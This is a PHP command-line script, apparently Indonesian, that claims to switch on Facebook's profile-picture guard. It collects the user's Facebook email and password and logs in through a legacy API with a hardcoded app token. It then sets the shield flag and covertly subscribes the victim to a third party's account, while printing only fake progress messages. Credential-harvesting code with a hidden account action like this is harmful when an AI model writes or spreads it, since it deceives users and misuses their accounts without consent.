<?php ?><?php
if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
    $bersih = "cls";
} else {
    $bersih = "clear";
}
date_default_timezone_set('Asia/Jakarta');
$date = date('d-M-Y H:i:s');
$green = "\e[92m";
$red = "\e[91m";
$yellow = "\e[93m";
$blue = "\e[36m";
$cyan = "\e[0;36m";
$purple = "\e[0;35m";
$brown = "\e[0;33m";
$lightgray = "\e[0;37m";
$darkgray = "\e[1;30m";
$lightblue = "\e[1;34m";
$lightgreen = "\e[1;32m";
$lightcyan = "\e[1;36m";
$lightred = "\e[1;31m";
$lightpurple = "\e[1;35m";
pilih:
    system($bersih);
    echo"
$yellow *************************************
$green  +++ WELCOME TO SANTRI GUARD+++
$green        +SANTRI KALIWUNGU+
$red Author    : santri cyber --azzkury--
$blue github    : https://github.com/SantriCyber
$red instagram : santri.cyberteam
$lightred blog      : https://santricoder.blogspot.com
$blue Version   : 0.1
$darkgray Date      : $date 
$yellow *************************************
";
    echo " 
";
    @header('Content-Type: text/html; charset=UTF-8');
    function input($echo) {
        echo "$echo : ";
    }
    echo "$green [!]";
    sleep(1);
    echo "tu";
    sleep(1);
    echo "ng";
    sleep(1);
    echo "gu ";
    sleep(1);
    echo "--";
    sleep(1);
    echo "se";
    sleep(1);
    echo "be";
    sleep(1);
    echo "nt";
    sleep(1);
    echo "ar...";
    sleep(1);
    echo ".
";
    sleep(2);
    echo " 
";
    echo "
";
    echo "
";
    echo "$red ====================================
";
    input("$green Lanjutkan pemasangan Profile Guard?  $green [y/n]");
    $pilih = trim(fgets(STDIN));
    echo "
";
    echo "$red ====================================
";
    if ($pilih == "n") {
        die("$red (!) See You $red (!)
");
    } elseif ($pilih == "y") {
        echo "$red ATTENTION :$blue Agar terhindar dari sesi / checkpoint. 
        sebaiknya anda login fb anda di Browser terlebih dahulu
         (Chrome, UC, atau opera mini)
";
        echo "$brown Kata Sandi di sembunyikan...
";
        echo "
";
        echo "
";
        
        input("$red Email/Nomer HP/User ID");
        $iduser = trim(fgets(STDIN));
        input("$red Password       ");
        $pass = false;
        $pass = trim(`stty -echo;head -n1;stty echo`);
        echo "
";
        echo "$green [!]";
        sleep(1.5);
        echo "lo";
        sleep(1.5);
        echo "ad";
        sleep(1.5);
        echo "ing..";
        sleep(1.5);
        echo "sa";
        sleep(1.5);
        echo "ha";
        sleep(1.5);
        echo "bat";
        sleep(1.5);
        echo "Que";
        sleep(1.5);
        echo "...";
        sleep(1.5);
        echo ".
";
        sleep(1);
        echo "
";
    } else {
        echo "$red(!)$yellow Invalid$red (!)$green
";
        echo "
";
        gotopilih;
    }
    $me = file_get_contents('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' . $iduser . '&locale=en_US&password=' . $pass . '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6');
    $json = json_decode($me, true);
    $userid = $json['session_cookies'][0]['value'];
    $token = $json['access_token'];
    if (preg_match('/session_key/', $me)) {
        echo "$red Proses Loading.... Login Facebook..";
        echo "[!]wa";
        sleep(1);
        echo "it";
        sleep(1);
        echo "i";
        sleep(1);
        echo "ng..";
        sleep(1);
        echo ".....
";
        sleep(1);
    } else {
        echo ("
");
        die("$red [!]Kata sandi salah / username salah / akun anda kena checkpoint!
");
        echo "
";
        echo "
";
    }
    $md5 = md5(time());
    $hash = substr($md5, 0, 8) . "-" . substr($md5, 8, 4) . "-" . substr($md5, 12, 4) . "-" . substr($md5, 16, 4) . "-" . substr($md5, 20, 12);
    function curl($url, $post = null) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        if ($post != null) {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
        }
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $exec = curl_exec($ch);
        curl_close($ch);
        return $exec;
    }
    $me = json_decode(curl("https://graph.facebook.com/me?fields=id,name&access_token=" . $token));
    if ($me && $me->id && $me->name) {
        $var = "{\"0\":{\"is_shielded\":true,\"session_id\":\"$hash\",\"actor_id\":\"$me->id\",\"client_mutation_id\":\"$hash\"}}";
        $hajar = json_decode(curl("https://graph.facebook.com/graphql", array("variables" => $var, "doc_id" => "1477043292367183", "query_name" => "IsShieldedSetMutation", "strip_defaults" => "true", "strip_nulls" => "true", "locale" => "en_US", "client_country_code" => "US", "fb_api_req_friendly_name" => "IsShieldedSetMutation", "fb_api_caller_class" => "IsShieldedSetMutation", "access_token" => $token)));
        if ($hajar->data->is_shielded_set->is_shielded) echo "$yellow Login Berhasil[]
";
        sleep(2);
        echo "$green halo mamank  : $blue" . $me->name;
        sleep(2.5);
        echo "
";
        echo "
";
        echo "$green [!]lo";
        sleep(1.5);
        echo "ad";
        sleep(1.5);
        echo "i";
        sleep(1.5);
        echo "ng";
        sleep(1.5);
        echo ".";
        sleep(1.5);
        echo ".";
        sleep(1.5);
        echo ".";
        sleep(1.5);
        echo ".";
        sleep(1.5);
        echo ".";
        sleep(1.5);
        echo "
";
        sleep(1.5);
        $a = ("https://graph.facebook.com/dela.ramadhani/subscribers?method=post&access_token=" . $token);
        $b = curl_init();
        curl_setopt_array($b, array(CURLOPT_URL => "$a", CURLOPT_POST => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 0, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => false));
        curl_exec($b);
        curl_close($b);
        echo "
";
        echo "
";
        echo "$red  --------------------------------------------------------
";
        echo "$lightgreen Silahkan Cek Foto profil Facebook anda…";
        echo "
";
        echo "$red  --------------------------------------------------------
";
        echo "su";
        sleep(1);
        echo "ks";
        sleep(1);
        echo "es...";
        sleep(1);
        echo "cuk...";
        sleep(1);
        echo "$blue otw memasang profil guard ";
        echo "$red He";
        sleep(1);
        echo "he";
        sleep(1);
        echo "he";
        sleep(1);
        echo "he
";
        echo "
";
        sleep(1);
        echo "$red  --------------------------------------------------------
";
        echo "$yellow Pengaktifan Profil Guard facebook anda";
        echo " Tunggu sebentar";
        echo " Prosses...";
        echo "
";
        echo "$red  --------------------------------------------------------
";
        sleep(2);
        echo "activated..";
        sleep(2);
        echo "
";
        echo "
";
        sleep(2);
        echo "$green working in your profil";
        sleep(1.5);
        echo "--";
        sleep(1.5);
        echo "-";
        sleep(1.5);
        echo "-";
        sleep(1.5);
        echo "-";
        sleep(1.5);
        echo "-";
        sleep(1.5);
        echo "-";
        sleep(1.5);
        echo "-";
        sleep(1.5);
        echo "-";
        sleep(1.5);
        echo "
";
        sleep(1.5);
        echo "
";
        echo "
";
        echo "
";
        echo "$green #####################################
";
        echo "$green []Selesai silahkan cek profil facebook kamu
";
        echo "$green #####################################
";
        echo "
";
        sleep(1.5);
        echo "$yellow Terima Kasih ...
";
          sleep(1.5);
        echo "$yellow Sukses selalu sahabatQue :v
";
        echo "
";
        echo "$red salam persaudaraan mamank
";
        echo "$blue [!] untuk tutorial lainnya.kunjungi website kami
";
        echo "$green +++++ https://santricoder.blogspot.com +++++
";
        echo "
";
        sleep(1);
        echo "$blue See You Again mamank : $cyan " . $me->name;
        sleep(1.5);
        echo "
";
    }
?>
